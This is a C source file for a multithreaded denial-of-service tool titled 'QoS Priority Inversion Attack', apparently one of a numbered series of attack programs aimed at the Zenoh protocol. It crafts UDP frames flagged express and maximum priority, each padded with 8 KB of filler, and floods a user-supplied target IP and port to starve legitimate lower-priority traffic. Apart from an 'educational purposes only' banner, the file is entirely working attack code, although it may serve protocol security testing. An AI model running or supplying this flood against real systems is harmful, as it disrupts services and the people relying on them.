/*
 * Attack 14: QoS Priority Inversion Attack
 * Floods high-priority channels to block legitimate traffic
 * 
 * Compile: gcc -o attack14_qos attack_14_qos_inversion.c -pthread
 * Run: ./attack14_qos <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_FRAME 0x00
#define Z_FLAG_RELIABLE 0x20
#define Z_FLAG_EXTENSIONS 0x80

// QoS Extension IDs
#define Z_EXT_QOS 0x03
#define Z_QOS_EXPRESS 0x01
#define Z_QOS_PRIORITY_MAX 0x07  // Highest priority

static volatile int g_running = 1;
static atomic_ullong g_high_priority_sent = 0;
static atomic_ullong g_low_priority_blocked = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping QoS inversion attack...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

size_t craft_high_priority_frame(unsigned char *buffer, unsigned long long seq) {
    size_t offset = 0;
    
    // FRAME header with extensions
    buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE | Z_FLAG_EXTENSIONS;
    
    // Sequence number
    offset += encode_zint(buffer + offset, seq);
    
    // QoS Extension
    buffer[offset++] = Z_EXT_QOS;
    buffer[offset++] = 1; // Extension length
    
    // QoS value: EXPRESS + MAX_PRIORITY
    buffer[offset++] = Z_QOS_EXPRESS | (Z_QOS_PRIORITY_MAX << 5);
    
    // Large payload to consume bandwidth
    size_t payload_size = 8192;
    memset(buffer + offset, 0xAA, payload_size);
    offset += payload_size;
    
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[16384];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    // Increase socket buffer
    int sndbuf = 2 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (high-priority flooding)\n", args->thread_id);
    
    unsigned long long seq = args->thread_id * 1000000ULL;
    unsigned long local_count = 0;
    
    while (g_running) {
        // Send burst of high-priority messages
        for (int i = 0; i < 50; i++) {
            size_t msg_len = craft_high_priority_frame(buffer, seq++);
            
            ssize_t sent = sendto(sock, buffer, msg_len, 0,
                                 (struct sockaddr*)&target_addr,
                                 sizeof(target_addr));
            
            if (sent > 0) {
                atomic_fetch_add(&g_high_priority_sent, 1);
                local_count++;
            }
        }
        
        if (local_count % 1000 == 0) {
            printf("[Thread %d] Sent %lu high-priority frames\n",
                   args->thread_id, local_count);
        }
        
        usleep(100); // Minimal delay
    }
    
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh QoS Priority Inversion Attack      ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Strategy: Flood with EXPRESS + MAX_PRIORITY\n");
    printf("[*] Effect: Blocks normal/low-priority traffic\n\n");
    
    signal(SIGINT, signal_handler);
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_high_priority_sent);
        time_t elapsed = time(NULL) - start;
        printf("[*] High-priority frames: %llu | Rate: %.2f fps\n",
               total, elapsed > 0 ? (double)total / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ High-Priority Frames: %-20llu ║\n", 
           (unsigned long long)atomic_load(&g_high_priority_sent));
    printf("║ Duration:             %-20ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}